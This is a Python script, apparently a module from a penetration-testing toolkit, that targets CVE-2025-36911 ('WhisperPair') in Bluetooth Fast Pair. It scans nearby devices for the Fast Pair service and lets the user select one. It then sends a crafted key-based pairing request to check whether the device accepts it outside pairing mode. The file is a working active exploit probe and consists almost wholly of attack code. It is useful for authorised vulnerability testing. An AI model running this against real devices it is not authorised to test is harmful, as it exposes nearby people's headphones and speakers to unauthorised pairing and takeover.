#!/usr/bin/env python3
# @name: WhisperPair Safety Test (CVE-2025-36911)
# @desc: Demonstrates the Fast Pair pairing mode bypass vulnerability.
# @category: bluetooth
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"seconds","label":"Scan duration","type":"number","default":"8"}]
import asyncio,os,sys
from bleak import BleakClient,BleakScanner
from payloads._web_input import request_input
SERVICE='0000fe2c-0000-1000-8000-00805f9b34fb'; CHARACTERISTIC='fe2c1234-8366-4814-8eb0-01de32100bea'
async def discover(seconds):return await BleakScanner.discover(timeout=seconds,return_adv=True)
async def test(address):
 async with BleakClient(address,timeout=15) as client:
  services=client.services
  service=services.get_service(SERVICE)
  if not service:return 'Not applicable: Fast Pair service was not exposed.'
  characteristic=service.get_characteristic(CHARACTERISTIC)
  if not characteristic:return 'Not applicable: key-based pairing characteristic was absent.'
  provider=bytes.fromhex(address.replace(':','').replace('-',''))
  try:await client.write_gatt_char(characteristic,b'\x00\x11'+provider+os.urandom(8),response=True);return 'Potentially vulnerable: request was accepted outside pairing mode.'
  except Exception:return 'Request rejected; this test did not reproduce the vulnerability.'
def main():
 try:seconds=max(2,min(int(sys.argv[1] if len(sys.argv)>1 else '8'),60))
 except ValueError:return 2
 print(f'Scanning for {seconds} seconds…',flush=True)
 try:found=asyncio.run(discover(seconds))
 except Exception as e:print('Scan failed:',e);return 1
 candidates=[]
 for address,(device,adv) in found.items():
  uuids=[u.lower() for u in (adv.service_uuids or [])];name=adv.local_name or device.name or '(unknown)'
  if any('fe2c' in u for u in uuids):candidates.append((address,name,adv.rssi))
 if not candidates:print('No Fast Pair advertisers were found.');return 1
 choice=int(request_input('Select authorized Fast Pair device',input_type='select',choices=[{'value':str(i),'label':f'{name} · {addr} · {rssi} dBm'} for i,(addr,name,rssi) in enumerate(candidates)]))
 try:print(asyncio.run(test(candidates[choice][0])));return 0
 except Exception as e:print('Test failed:',e);return 1
if __name__=='__main__':raise SystemExit(main())
